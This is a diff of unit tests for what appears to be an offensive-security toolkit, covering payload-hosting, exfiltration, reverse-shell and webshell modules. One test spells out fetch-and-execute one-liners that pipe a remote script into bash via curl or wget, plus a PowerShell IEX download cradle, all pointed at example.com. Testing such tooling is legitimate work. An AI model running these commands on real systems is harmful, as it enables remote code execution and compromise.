@@ -205,7 +205,9 @@ class TestNetworkModule:
     def test_reverse_shell_function_exists(self):
         from ofx.api.network import reverse_shell
 
-        assert callable(reverse_shell) and not inspect.iscoroutinefunction(reverse_shell)
+        assert callable(reverse_shell) and not inspect.iscoroutinefunction(
+            reverse_shell
+        )
 
 
 class TestHttpServerModule:
@@ -233,6 +235,89 @@ class TestHttpServerModule:
         assert hasattr(server, "bind_ip")
         assert hasattr(server, "bind_port")
         assert server.https is False
+
+    def test_simple_http_server_import(self):
+        from ofx.api.httpserver import SimpleHTTPServer
+
+        assert SimpleHTTPServer is not None
+
+    def test_simple_http_server_init(self):
+        from ofx.api.httpserver import SimpleHTTPServer
+
+        server = SimpleHTTPServer(port=8000, directory="/tmp", allow_upload=True)
+        assert server.port == 8000
+        assert str(server.directory) == "/tmp"
+        assert server.allow_upload is True
+        assert server.host == "0.0.0.0"
+
+    def test_payload_server_import(self):
+        from ofx.api.httpserver import PayloadServer
+
+        assert PayloadServer is not None
+
+    def test_payload_server_init(self):
+        from ofx.api.httpserver import PayloadServer
+
+        server = PayloadServer(port=8080, host="127.0.0.1")
+        assert server.port == 8080
+        assert server.host == "127.0.0.1"
+        assert server.payloads == {}
+        assert server.hits == {}
+
+    def test_payload_server_add_remove_payload(self):
+        from ofx.api.httpserver import PayloadServer
+
+        server = PayloadServer()
+        server.add_payload("/test.txt", content="Hello World")
+        assert "/test.txt" in server.payloads
+        assert server.get_hits("/test.txt") == 0
+
+        server.remove_payload("/test.txt")
+        assert "/test.txt" not in server.payloads
+
+    def test_exfil_server_import(self):
+        from ofx.api.httpserver import ExfilServer
+
+        assert ExfilServer is not None
+
+    def test_exfil_server_init(self):
+        from ofx.api.httpserver import ExfilServer
+
+        server = ExfilServer(port=9000, save_dir="/tmp/exfil", auto_timestamp=False)
+        assert server.port == 9000
+        assert str(server.save_dir) == "/tmp/exfil"
+        assert server.auto_timestamp is False
+        assert server.host == "0.0.0.0"
+
+    def test_start_server_function(self):
+        from ofx.api.httpserver import start_server
+
+        assert callable(start_server)
+
+    def test_create_oneliner_function(self):
+        from ofx.api.httpserver import create_oneliner
+
+        # Test curl
+        cmd = create_oneliner("http://example.com/payload.sh", "curl")
+        assert "curl -s http://example.com/payload.sh | bash" == cmd
+
+        # Test wget
+        cmd = create_oneliner("http://example.com/payload.sh", "wget")
+        assert "wget -q -O - http://example.com/payload.sh | bash" == cmd
+
+        # Test powershell
+        cmd = create_oneliner("http://example.com/payload.sh", "powershell")
+        assert (
+            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.sh')\""
+            == cmd
+        )
+
+        # Test invalid method
+        try:
+            create_oneliner("http://example.com/payload.sh", "invalid")
+            assert False, "Should raise ValueError"
+        except ValueError:
+            pass
 
 
 class TestOOBModule:
@@ -296,7 +381,12 @@ class TestWebshellModule:
     """Test webshell submodule."""
 
     def test_webshell_imports(self):
-        from ofx.api.exploitation.webshell import WebShell, WebShellClient, WebShellCodeFactory, generate_webshell
+        from ofx.api.exploitation.webshell import (
+            WebShell,
+            WebShellClient,
+            WebShellCodeFactory,
+            generate_webshell,
+        )
         from ofx.api.exploitation.webshell.shell.asp import AspShell
         from ofx.api.exploitation.webshell.shell.aspx import AspxShell
         from ofx.api.exploitation.webshell.shell.jsp import JspShell
